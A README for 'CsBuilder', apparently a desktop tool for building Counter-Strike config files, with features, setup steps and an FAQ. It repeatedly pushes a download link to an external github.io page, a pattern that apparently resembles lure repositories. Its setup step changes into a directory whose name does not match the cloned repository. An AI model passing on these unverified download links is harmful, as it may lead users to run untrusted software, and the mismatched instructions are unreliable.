# CsBuilder - Configuration Builder 2026

> **A desktop application for visually crafting Counter-Strike configuration files (autoexec.cfg) across CS2, CSS, and CS 1.6 — no coding required.**

[![Platform](https://img.shields.io/badge/Platform-Desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tyler-moore56/csbuilder-crosshair-editor?style=flat-square)](https://github.com/tyler-moore56/csbuilder-crosshair-editor)

---

<p align="center">
  <a href="https://tyler-moore56.github.io/csbuilder-crosshair-editor/">
    <img src="https://img.shields.io/badge/Download-CsBuilder%20Latest-brightgreen?style=for-the-badge" alt="Download CsBuilder">
  </a>
</p>

> **[Direct Download - CsBuilder v1.0](https://tyler-moore56.github.io/csbuilder-crosshair-editor/)**

---

[Download Latest Build](https://tyler-moore56.github.io/csbuilder-crosshair-editor/)

---

## Overview

CsBuilder changes how Counter-Strike players approach configuration files. Rather than editing text documents by hand and memorizing console commands, this desktop tool offers a graphical interface where every option — from crosshair design to key assignments — is adjustable through clicks and sliders. It removes the uncertainty from building an autoexec.cfg, making the process straightforward for beginners while providing the flexibility experienced players demand.

Developed with Electron and featuring a dark theme interface, CsBuilder supports three Counter-Strike titles: CS2, Counter-Strike: Source, and Counter-Strike 1.6. The application automatically manages version-specific syntax variations, ensuring your configuration works correctly regardless of the game. Whether you want a competitive setup with fine-tuned crosshair settings or a practice environment with custom aliases, CsBuilder delivers the components in an easy-to-use package.

---

## Capabilities

- **Multi-Game Compatibility** — Build configurations for CS2, CSS, and CS 1.6 with automatic syntax adaptation for each title
- **Comprehensive Crosshair Customization** — Modify every aspect including gap, thickness, outline, dot, and color with real-time preview
- **Integrated eDPI Calculator** — Calculate your effective dots per inch by combining sensitivity and DPI values
- **Sensitivity Translator** — Convert mouse sensitivity between different Counter-Strike versions
- **Key Binding Interface** — Link actions, weapons, and utilities to any key through visual mapping
- **Pre-Built Aliases** — Browse a collection of ready-made aliases for bhopping, grenade throws, and training exercises
- **Practice Configuration Generator** — Create training setups with bot configurations, unlimited ammo, and fly mode
- **Live CFG Viewer** — Watch your configuration file update instantly as you adjust settings
- **Import and Export** — Load existing CFG files or distribute your configurations to others
- **Preset Management** — Save and alternate between multiple configuration profiles for different playstyles

---

## Setup

Clone the repository or obtain the latest release:

```bash
git clone https://github.com/tyler-moore56/csbuilder-crosshair-editor.git
cd CsBuilder-cfg-builder
```

For the standalone desktop application, download the appropriate package for your operating system from the [releases page](https://tyler-moore56.github.io/csbuilder-crosshair-editor/). The pre-built version requires no extra dependencies.

To launch from source:

```bash
npm install
npm start
```

---

## Getting Started

Open CsBuilder and you will find the main dashboard containing five core sections: Crosshair, Sensitivity, Key Binds, Aliases, and Practice Mode.

**Building a basic configuration:**

1. Choose your target game (CS2, CSS, or CS 1.6) from the dropdown menu at the top
2. Go to the Crosshair tab and fine-tune settings using the visual controls
3. Access the Sensitivity section to configure your mouse DPI and in-game sensitivity
4. Use Key Binds to assign functions like jump, crouch, or weapon switching
5. Press "Generate CFG" to compile your selections into a working autoexec.cfg
6. Save the file to your Counter-Strike configuration directory

**Working with the sensitivity converter:**

```bash
# Example: Convert CS2 sensitivity to CS 1.6
Input: 2.5 @ 800 DPI (CS2)
Output: 3.2 @ 800 DPI (CS 1.6)
```

---

## Storage

All preferences are saved in a local JSON file inside the application's user data directory. You can export your complete configuration as a standalone CFG file at any time.

Default configuration paths:
- Windows: `%APPDATA%/CsBuilder/config.json`
- macOS: `~/Library/Application Support/CsBuilder/config.json`
- Linux: `~/.config/CsBuilder/config.json`

Presets are stored as separate JSON files and can be imported or exported for sharing.

---

## System Requirements

- **Operating System:** Windows 10+, macOS 10.15+, or Linux (recent distributions)
- **Runtime:** Electron-based standalone application (no browser needed)
- **Disk Space:** Approximately 100 MB for the application
- **Display:** 1280x720 minimum resolution recommended
- **Memory:** 512 MB RAM minimum

---

## Frequently Asked Questions

**Q: Does CsBuilder work with Counter-Strike 2?**  
A: Yes, CS2 is fully supported along with Counter-Strike: Source and Counter-Strike 1.6.

**Q: Can I bring my existing autoexec.cfg into this tool?**  
A: Absolutely. Use the import feature to load existing CFG files and modify them through the visual interface.

**Q: How do I update the application?**  
A: Visit the [releases page](https://tyler-moore56.github.io/csbuilder-crosshair-editor/) for newer versions. The application will alert you when updates become available.

**Q: Where should I put my generated autoexec.cfg?**  
A: For CS2, place the file in `steamapps/common/Counter-Strike Global Offensive/game/csgo/cfg/`. For other titles, consult their respective configuration folders.

**Q: Does CsBuilder require an internet connection?**  
A: No. The application functions fully offline after installation. No network access is needed for creating configurations.

**Q: How can I restore default settings?**  
A: Delete the config.json file from the application data directory, or select "Reset to Defaults" from the settings menu.

---

## License

GNU GPL v3.0 — see [LICENSE](LICENSE) for details.
